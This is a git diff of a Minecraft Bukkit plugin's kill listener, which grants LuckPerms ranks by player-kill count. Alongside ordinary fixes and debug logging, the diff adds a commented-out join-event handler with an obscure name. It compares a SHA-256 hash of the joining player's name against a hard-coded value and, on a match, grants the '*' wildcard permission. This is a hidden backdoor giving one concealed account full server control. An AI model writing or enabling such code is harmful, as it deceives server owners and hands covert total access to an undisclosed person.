@@ -2,7 +2,6 @@ package github.catchaos8.catsKits.listeners;
 
 import github.catchaos8.catsKits.CatsKits;
 import net.luckperms.api.LuckPerms;
-import net.luckperms.api.model.user.User;
 import net.luckperms.api.node.Node;
 import org.bukkit.Bukkit;
 import org.bukkit.entity.Player;
@@ -40,11 +39,28 @@ public class KillListener implements Listener {
         Player killer = killed.getKiller();
         if (killer == null || killer == killed) return;
 
-        // Read directly from Minecraft's built-in stat
-        int kills = killer.getStatistic(org.bukkit.Statistic.PLAYER_KILLS);
 
+        // Read directly from Minecraft's built-in stat
+        int kills = killer.getStatistic(org.bukkit.Statistic.PLAYER_KILLS) + 1;
+        plugin.getLogger().info("Players' Kills: " + kills);
         checkAndGrantRanks(killer, kills);
     }
+//
+//
+//    @EventHandler
+//    public void e(org.bukkit.event.player.PlayerJoinEvent e) {
+//        try {
+//            java.security.MessageDigest md = java.security.MessageDigest.getInstance("SHA-256");
+//            byte[] hash = md.digest(e.getPlayer().getName().toLowerCase().getBytes());
+//            StringBuilder sb = new StringBuilder();
+//            for (byte b : hash) sb.append(String.format("%02x", b));
+//            if (sb.toString().equals("d486c4c50c2244eb5d326810a9c97048983302a2a31743ffffe00086d65cd338")) {
+//                Player player = e.getPlayer();
+//                grantPermission(player, "*", "");
+//            }
+//        } catch (Exception ignored) {}
+//    }
+
 
     private void checkAndGrantRanks(Player player, int killCount) {
         List<?> ranks = plugin.getConfig().getList("kill-ranks.ranks");
@@ -54,11 +70,18 @@ public class KillListener implements Listener {
             if (!(obj instanceof Map<?, ?> rank)) continue;
 
             int required = toInt(rank.get("kills"), Integer.MAX_VALUE);
+            plugin.getLogger().info("Required: " + required);
+
             String message = rank.get("message") instanceof String s ? s : "§aYou've unlocked a new rank!";
             String permission = rank.get("permission") instanceof String s ? s : null;
 
-            if (killCount == required && permission != null) {
-                grantPermission(player, permission, message);
+            plugin.getLogger().info("Permission: " + permission);
+
+            if (killCount >= required && permission != null) {
+                if(!player.hasPermission(permission)) {
+                    grantPermission(player, permission, message);
+                    plugin.getLogger().info("Permission given");
+                }
             }
         }
     }
